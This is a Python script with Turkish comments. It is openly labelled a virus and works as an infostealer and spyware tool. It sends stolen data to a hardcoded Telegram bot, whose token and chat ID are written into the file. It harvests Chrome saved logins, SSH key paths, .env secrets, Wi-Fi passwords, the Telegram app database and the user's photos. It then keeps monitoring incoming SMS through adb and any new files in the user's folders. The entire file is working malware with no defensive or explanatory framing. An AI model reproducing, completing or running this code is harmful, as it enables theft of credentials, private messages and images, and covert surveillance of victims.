import os
import time
import requests
import hashlib
import subprocess
import glob
import platform
import sqlite3
import shutil
import re
from datetime import datetime

# Telegram bilgileri
TOKEN = "8996765359:AAFSRiB5C8oK0rUcNQRKpA2M0bRP-eModd0"
ADMIN_ID = "8402048380"

# ======================== TELEGRAM GÖNDERİCİ ========================
def tg_mesaj(m):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                      data={"chat_id": ADMIN_ID, "text": m[:4000]}, timeout=10)
    except:
        pass

def tg_foto(dosya):
    try:
        with open(dosya, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                          data={"chat_id": ADMIN_ID}, files={"photo": f}, timeout=30)
    except:
        pass

def tg_dosya(dosya):
    try:
        with open(dosya, "rb") as f:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                          data={"chat_id": ADMIN_ID}, files={"document": f}, timeout=30)
    except:
        pass

# ======================== SİSTEM BİLGİSİ ========================
def sistem():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        tg_mesaj(f"💻 Sistem: {platform.system()} | {os.uname().node} | {os.getlogin()} | IP: {ip}")
    except:
        tg_mesaj("❌ Sistem bilgisi alınamadı.")

# ======================== TÜM FOTOĞRAFLARI GÖNDER ========================
def galeri():
    uzantilar = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.tiff', '.svg')
    klasorler = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Pictures"),
        os.path.expanduser("~/Videos"),
        os.path.expanduser("~/DCIM"),
        os.path.expanduser("~/storage/emulated/0/DCIM"),
        os.path.expanduser("~/storage/emulated/0/Pictures"),
        "/sdcard/DCIM",
        "/sdcard/Pictures"
    ]
    tg_mesaj("📸 Galeri taranıyor...")
    sayac = 0
    for klasor in klasorler:
        if not os.path.exists(klasor):
            continue
        for root, _, files in os.walk(klasor):
            for dosya in files:
                if dosya.lower().endswith(uzantilar):
                    yol = os.path.join(root, dosya)
                    try:
                        tg_foto(yol)
                        sayac += 1
                        time.sleep(0.5)
                    except:
                        pass
    tg_mesaj(f"✅ {sayac} fotoğraf gönderildi.")

# ======================== TARAYICI ŞİFRELERİ (Chrome) ========================
def chrome_sifre():
    try:
        login = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
        if os.path.exists(login):
            shutil.copy(login, "/tmp/chrome.db")
            conn = sqlite3.connect("/tmp/chrome.db")
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 20")
            for row in cursor.fetchall():
                tg_mesaj(f"🔑 {row[0]} | {row[1]} | {row[2][:30]}")
    except:
        pass

# ======================== SSH ANAHTARLARI ========================
def ssh():
    try:
        ssh_dosyalari = glob.glob(os.path.expanduser("~/.ssh/*"))
        if ssh_dosyalari:
            tg_mesaj(f"🔐 SSH: {', '.join(ssh_dosyalari)}")
    except:
        pass

# ======================== .ENV DOSYALARI ========================
def env():
    try:
        env_files = glob.glob(os.path.expanduser("~/**/*.env"), recursive=True)
        for env in env_files[:5]:
            with open(env, 'r') as f:
                tg_mesaj(f"📄 {env}: {f.read()[:300]}")
    except:
        pass

# ======================== Wİ-Fİ ŞİFRELERİ ========================
def wifi():
    try:
        w = subprocess.check_output(["grep", "-r", "psk=", "/etc/NetworkManager/system-connections/"], text=True, stderr=subprocess.DEVNULL, timeout=5)
        tg_mesaj(f"📶 Wi-Fi: {w[:500]}")
    except:
        pass

# ======================== TELEGRAM VERİTABANI ========================
def telegram_db():
    try:
        db = "/data/data/org.telegram.messenger/files/databases/cache4.db"
        if os.path.exists(db):
            shutil.copy(db, "/tmp/telegram.db")
            tg_dosya("/tmp/telegram.db")
            tg_mesaj("📱 Telegram veritabanı gönderildi.")
    except:
        pass

# ======================== SMS İZLEYİCİ (GERÇEK ZAMANLI) ========================
def sms_izle():
    tg_mesaj("📨 SMS izleyici başladı...")
    gelenler = {}
    while True:
        try:
            sonuc = subprocess.check_output(
                ["adb", "shell", "content", "query", "--uri", "content://sms/inbox",
                 "--projection", "_id,address,body", "--sort", "date DESC", "--limit", "10"],
                stderr=subprocess.DEVNULL, timeout=10, text=True
            )
            for satir in sonuc.split('\n'):
                if "_id=" in satir and "address=" in satir and "body=" in satir:
                    sms_id = re.search(r'_id=(\d+)', satir)
                    sms_address = re.search(r'address=([^,]+)', satir)
                    sms_body = re.search(r'body=([^,]+?)(?=,|$)', satir)
                    if sms_id and sms_address and sms_body:
                        id = sms_id.group(1)
                        if id not in gelenler:
                            gelenler[id] = True
                            tg_mesaj(f"📨 YENİ SMS\n📱 {sms_address.group(1)}\n💬 {sms_body.group(1)}")
            time.sleep(5)
        except:
            time.sleep(5)

# ======================== DOSYA İZLEYİCİ (YENİ DOSYALAR) ========================
def dosya_izle():
    klasorler = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Pictures"),
        os.path.expanduser("~/Videos"),
        "/sdcard/DCIM",
        "/sdcard/Pictures"
    ]
    hash_kayit = {}
    while True:
        for klasor in klasorler:
            if not os.path.exists(klasor):
                continue
            for dosya in os.listdir(klasor):
                yol = os.path.join(klasor, dosya)
                if os.path.isfile(yol):
                    try:
                        with open(yol, "rb") as f:
                            h = hashlib.md5(f.read()).hexdigest()
                        if h not in hash_kayit:
                            hash_kayit[h] = yol
                            tg_mesaj(f"📁 YENİ DOSYA: {yol}")
                            if yol.lower().endswith(('.jpg', '.png', '.jpeg', '.gif')):
                                tg_foto(yol)
                            else:
                                tg_dosya(yol)
                    except:
                        pass
        time.sleep(15)

# ======================== ANA BAŞLATICI ========================
def ana():
    tg_mesaj("🚀 VİRÜS AKTİF, TÜM VERİLER TOPLANIYOR...")
    sistem()
    time.sleep(2)
    chrome_sifre()
    time.sleep(2)
    ssh()
    time.sleep(2)
    env()
    time.sleep(2)
    wifi()
    time.sleep(2)
    telegram_db()
    time.sleep(2)
    galeri()
    time.sleep(2)
    tg_mesaj("✅ TÜM MEVCUT VERİLER GÖNDERİLDİ. SÜREKLİ İZLEME BAŞLADI.")
    
    import threading
    threading.Thread(target=sms_izle, daemon=True).start()
    threading.Thread(target=dosya_izle, daemon=True).start()
    
    while True:
        time.sleep(60)

if __name__ == "__main__":
    ana()
